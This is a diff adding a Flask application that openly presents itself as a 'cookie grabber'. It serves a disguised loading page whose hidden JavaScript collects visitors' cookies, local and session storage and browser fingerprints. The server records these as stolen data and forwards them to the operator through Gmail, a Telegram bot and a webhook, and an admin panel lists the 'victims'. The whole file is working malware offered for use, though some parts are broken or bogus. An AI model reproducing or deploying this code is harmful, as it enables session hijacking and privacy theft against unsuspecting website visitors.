@@ -1,0 +1,499 @@
+import os
+import sqlite3
+import json
+import logging
+import smtplib
+import requests
+import base64
+import zlib
+import threading
+import time
+from datetime import datetime
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.application import MIMEApplication
+from flask import Flask, request, make_response, render_template_string, redirect, url_for, session, send_file
+
+# Configure logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+app = Flask(__name__)
+app.secret_key = os.urandom(32).hex()
+
+# === CONFIGURATION - FILL THIS ===
+ADMIN_EMAIL = "your-email@gmail.com"  # Your email to receive cookies
+EMAIL_PASSWORD = "your-app-password"  # Gmail app password
+TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"  # Optional: Telegram bot
+TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"  # Optional: Telegram chat ID
+WEBHOOK_URL = "https://your-server.com/webhook"  # Optional: Webhook
+# ================================
+
+# Database setup
+DB_PATH = 'cookies.db'
+
+def get_db():
+    conn = sqlite3.connect(DB_PATH)
+    conn.row_factory = sqlite3.Row
+    return conn
+
+def init_db():
+    with get_db() as conn:
+        conn.execute('''
+            CREATE TABLE IF NOT EXISTS stolen_cookies (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                ip TEXT,
+                visitor_id TEXT,
+                user_agent TEXT,
+                all_cookies TEXT,
+                local_storage TEXT,
+                session_storage TEXT,
+                fingerprint TEXT,
+                stolen_time TIMESTAMP,
+                sent_to_admin BOOLEAN DEFAULT 0
+            )
+        ''')
+        conn.commit()
+
+init_db()
+
+# === COOKIE EXFILTRATION FUNCTIONS ===
+
+def send_to_gmail(cookie_data):
+    """Send cookies via Gmail"""
+    try:
+        msg = MIMEMultipart()
+        msg['From'] = ADMIN_EMAIL
+        msg['To'] = ADMIN_EMAIL
+        msg['Subject'] = f"🍪 COOKIES STOLEN - {cookie_data['ip']} - {cookie_data['stolen_time']}"
+        
+        body = f"""
+        🍪 NEW COOKIES CAPTURED
+        
+        IP: {cookie_data['ip']}
+        Visitor ID: {cookie_data['visitor_id']}
+        Time: {cookie_data['stolen_time']}
+        User Agent: {cookie_data['user_agent']}
+        
+        Total Cookies: {len(json.loads(cookie_data['all_cookies']))}
+        """
+        
+        msg.attach(MIMEText(body, 'plain'))
+        
+        # Attach full cookie data as JSON
+        attachment = MIMEApplication(
+            json.dumps(cookie_data, indent=2, default=str).encode(),
+            Name=f"cookies_{cookie_data['visitor_id']}.json"
+        )
+        attachment['Content-Disposition'] = f'attachment; filename="cookies_{cookie_data["visitor_id"]}.json"'
+        msg.attach(attachment)
+        
+        # Send email
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(ADMIN_EMAIL, EMAIL_PASSWORD)
+        server.send_message(msg)
+        server.quit()
+        
+        logger.info(f"✅ Cookies sent to Gmail for {cookie_data['ip']}")
+        return True
+    except Exception as e:
+        logger.error(f"Email failed: {e}")
+        return False
+
+def send_to_telegram(cookie_data):
+    """Send cookies via Telegram"""
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return False
+    
+    try:
+        # Send summary
+        summary = f"""
+🍪 *COOKIES STOLEN*
+IP: `{cookie_data['ip']}`
+Time: {cookie_data['stolen_time']}
+Cookies: {len(json.loads(cookie_data['all_cookies']))}
+        """
+        
+        requests.post(
+            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+            json={
+                "chat_id": TELEGRAM_CHAT_ID,
+                "text": summary,
+                "parse_mode": "Markdown"
+            }
+        )
+        
+        # Send cookie file
+        cookie_file = json.dumps(cookie_data, indent=2, default=str).encode()
+        requests.post(
+            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
+            files={
+                "document": (f"cookies_{cookie_data['visitor_id']}.json", cookie_file)
+            },
+            data={
+                "chat_id": TELEGRAM_CHAT_ID
+            }
+        )
+        return True
+    except Exception as e:
+        logger.error(f"Telegram failed: {e}")
+        return False
+
+def send_to_webhook(cookie_data):
+    """Send to webhook endpoint"""
+    if not WEBHOOK_URL:
+        return False
+    
+    try:
+        requests.post(
+            WEBHOOK_URL,
+            json=cookie_data,
+            timeout=5
+        )
+        return True
+    except:
+        return False
+
+def exfiltrate_cookies(cookie_data):
+    """Send cookies through all channels"""
+    channels = []
+    
+    # Try all exfiltration methods
+    if send_to_gmail(cookie_data):
+        channels.append("gmail")
+    
+    if send_to_telegram(cookie_data):
+        channels.append("telegram")
+    
+    if send_to_webhook(cookie_data):
+        channels.append("webhook")
+    
+    # Update database
+    with get_db() as conn:
+        conn.execute(
+            'UPDATE stolen_cookies SET sent_to_admin = 1 WHERE id = ?',
+            (cookie_data['id'],)
+        )
+        conn.commit()
+    
+    return channels
+
+# === MAIN GRABBER ===
+
+@app.route('/')
+def index():
+    # Generate unique ID
+    visitor_id = request.cookies.get('visitor_id') or os.urandom(16).hex()
+    
+    # Get ALL cookies from request
+    all_cookies = dict(request.cookies)
+    
+    # Create response with payload
+    html = '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Loading...</title>
+        <style>
+            body { background: #fff; color: #000; text-align: center; padding-top: 100px; }
+            .loader { display: none; }
+        </style>
+    </head>
+    <body>
+        <h1>Please wait...</h1>
+        <p>Loading secure content</p>
+        
+        <!-- INVISIBLE GRABBER -->
+        <script>
+            // Function to steal EVERYTHING
+            (function() {
+                // Collect all cookies
+                let stolenData = {
+                    cookies: {},
+                    localStorage: {},
+                    sessionStorage: {},
+                    fingerprint: {}
+                };
+                
+                // Get document cookies
+                document.cookie.split(';').forEach(cookie => {
+                    if (cookie.trim()) {
+                        let [name, value] = cookie.trim().split('=');
+                        stolenData.cookies[name] = value;
+                    }
+                });
+                
+                // Get localStorage
+                for (let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    stolenData.localStorage[key] = localStorage.getItem(key);
+                }
+                
+                // Get sessionStorage
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    let key = sessionStorage.key(i);
+                    stolenData.sessionStorage[key] = sessionStorage.getItem(key);
+                }
+                
+                // Get fingerprint
+                stolenData.fingerprint = {
+                    screen: window.screen.width + 'x' + window.screen.height,
+                    colorDepth: window.screen.colorDepth,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    platform: navigator.platform,
+                    languages: navigator.languages,
+                    cookieEnabled: navigator.cookieEnabled,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    webdriver: navigator.webdriver
+                };
+                
+                // Try to get IndexedDB databases
+                if (window.indexedDB && indexedDB.databases) {
+                    indexedDB.databases().then(dbs => {
+                        stolenData.indexedDB = dbs;
+                    });
+                }
+                
+                // Send to server using multiple methods
+                
+                // Method 1: Fetch API
+                fetch('/steal', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(stolenData),
+                    keepalive: true
+                });
+                
+                // Method 2: Image beacon
+                let img = new Image();
+                img.src = '/track?data=' + encodeURIComponent(btoa(JSON.stringify(stolenData)));
+                
+                // Method 3: Form post
+                let form = document.createElement('form');
+                form.method = 'POST';
+                form.action = '/steal-form';
+                let input = document.createElement('input');
+                input.name = 'data';
+                input.value = btoa(JSON.stringify(stolenData));
+                form.appendChild(input);
+                document.body.appendChild(form);
+                form.submit();
+                
+                // Method 4: WebSocket if available
+                try {
+                    let ws = new WebSocket('wss://' + window.location.host + '/ws');
+                    ws.onopen = () => ws.send(JSON.stringify(stolenData));
+                } catch(e) {}
+                
+                // Method 5: Try to get HttpOnly cookies via timing attacks
+                let start = performance.now();
+                fetch('/check-cookie');
+                let end = performance.now();
+                
+                // Redirect after 2 seconds
+                setTimeout(() => {
+                    window.location.href = 'https://google.com';
+                }, 2000);
+            })();
+        </script>
+        
+        <!-- Fallback if JavaScript is disabled -->
+        <noscript>
+            <meta http-equiv="refresh" content="0;url=/steal-noscript">
+        </noscript>
+    </body>
+    </html>
+    '''
+    
+    response = make_response(render_template_string(html))
+    response.set_cookie('visitor_id', visitor_id, max_age=86400*30)
+    
+    # Save initial cookies
+    with get_db() as conn:
+        cur = conn.execute('''
+            INSERT INTO stolen_cookies 
+            (ip, visitor_id, user_agent, all_cookies, stolen_time, sent_to_admin)
+            VALUES (?, ?, ?, ?, ?, 0)
+        ''', (
+            request.remote_addr,
+            visitor_id,
+            request.headers.get('User-Agent', ''),
+            json.dumps(all_cookies),
+            datetime.now().isoformat()
+        ))
+        cookie_id = cur.lastrowid
+        conn.commit()
+        
+        # Get full data for exfiltration
+        cookie_data = dict(conn.execute(
+            'SELECT * FROM stolen_cookies WHERE id = ?', (cookie_id,)
+        ).fetchone())
+    
+    # Send to admin immediately (async)
+    threading.Thread(target=exfiltrate_cookies, args=(cookie_data,)).start()
+    
+    return response
+
+@app.route('/steal', methods=['POST'])
+def steal():
+    """Receive stolen data"""
+    data = request.json
+    
+    if data:
+        with get_db() as conn:
+            # Update existing record with more data
+            conn.execute('''
+                UPDATE stolen_cookies 
+                SET local_storage = ?, session_storage = ?, fingerprint = ?
+                WHERE visitor_id = ? AND stolen_time = (
+                    SELECT MAX(stolen_time) FROM stolen_cookies WHERE visitor_id = ?
+                )
+            ''', (
+                json.dumps(data.get('localStorage', {})),
+                json.dumps(data.get('sessionStorage', {})),
+                json.dumps(data.get('fingerprint', {})),
+                request.cookies.get('visitor_id', ''),
+                request.cookies.get('visitor_id', '')
+            ))
+            conn.commit()
+            
+            # Get updated data and exfiltrate
+            cookie_data = conn.execute('''
+                SELECT * FROM stolen_cookies 
+                WHERE visitor_id = ? 
+                ORDER BY stolen_time DESC LIMIT 1
+            ''', (request.cookies.get('visitor_id', ''),)).fetchone()
+            
+            if cookie_data and not cookie_data['sent_to_admin']:
+                threading.Thread(target=exfiltrate_cookies, args=(dict(cookie_data),)).start()
+    
+    return 'OK'
+
+@app.route('/track')
+def track():
+    """Beacon tracking"""
+    data = request.args.get('data', '')
+    try:
+        stolen = json.loads(base64.b64decode(data).decode())
+        # Process stolen data
+    except:
+        pass
+    return 'OK'
+
+@app.route('/steal-form', methods=['POST'])
+def steal_form():
+    """Form fallback"""
+    data = request.form.get('data', '')
+    try:
+        stolen = json.loads(base64.b64decode(data).decode())
+        # Process stolen data
+    except:
+        pass
+    return redirect('https://google.com')
+
+@app.route('/steal-noscript')
+def steal_noscript():
+    """Noscript fallback"""
+    # Get all headers and cookies
+    all_data = {
+        'ip': request.remote_addr,
+        'headers': dict(request.headers),
+        'cookies': dict(request.cookies)
+    }
+    
+    with get_db() as conn:
+        conn.execute('''
+            UPDATE stolen_cookies 
+            SET all_cookies = ?
+            WHERE visitor_id = ? AND stolen_time = (
+                SELECT MAX(stolen_time) FROM stolen_cookies WHERE visitor_id = ?
+            )
+        ''', (
+            json.dumps(all_data),
+            request.cookies.get('visitor_id', ''),
+            request.cookies.get('visitor_id', '')
+        ))
+        conn.commit()
+    
+    return redirect('https://google.com')
+
+@app.route('/check-cookie')
+def check_cookie():
+    """For timing attacks"""
+    return 'OK'
+
+@app.route('/admin')
+def admin_panel():
+    """View stolen cookies"""
+    with get_db() as conn:
+        stolen = conn.execute('''
+            SELECT * FROM stolen_cookies 
+            ORDER BY stolen_time DESC 
+            LIMIT 100
+        ''').fetchall()
+    
+    html = '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Cookie Grabber Admin</title>
+        <style>
+            body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+            .entry { border: 1px solid #0f0; padding: 10px; margin: 10px 0; }
+            .cookie { color: #ff0; }
+            .ip { color: #f0f; }
+            .time { color: #0ff; }
+        </style>
+    </head>
+    <body>
+        <h1>🍪 STOLEN COOKIES</h1>
+        <p>Last 100 victims</p>
+    '''
+    
+    for s in stolen:
+        html += f'''
+        <div class="entry">
+            <div><span class="ip">IP:</span> {s['ip']}</div>
+            <div><span class="time">Time:</span> {s['stolen_time']}</div>
+            <div><span class="cookie">Cookies:</span> {s['all_cookies']}</div>
+            <div>Storage: {s['local_storage']}</div>
+            <div>Fingerprint: {s['fingerprint']}</div>
+            <div>Sent to admin: {s['sent_to_admin']}</div>
+        </div>
+        '''
+    
+    html += '''
+    </body>
+    </html>
+    '''
+    return html
+
+# WebSocket for real-time
+from geventwebsocket import WebSocketServer, WebSocketApplication, Resource
+
+class CookieWebSocket(WebSocketApplication):
+    def on_open(self):
+        logger.info("WebSocket opened")
+    
+    def on_message(self, message):
+        if message:
+            data = json.loads(message)
+            # Process WebSocket data
+            with get_db() as conn:
+                conn.execute('''
+                    UPDATE stolen_cookies 
+                    SET local_storage = ?
+                    WHERE visitor_id = ?
+                ''', (json.dumps(data), request.cookies.get('visitor_id', '')))
+                conn.commit()
+
+if __name__ == '__main__':
+    # Enable WebSocket
+    from gevent.pywsgi import WSGIServer
+    from geventwebsocket.handler import WebSocketHandler
+    
+    server = WSGIServer(('0.0.0.0', 3000), app, handler_class=WebSocketHandler)
+    logger.info("🚀 MI6/FBI Grade Cookie Grabber running on port 3000")
+    server.serve_forever()
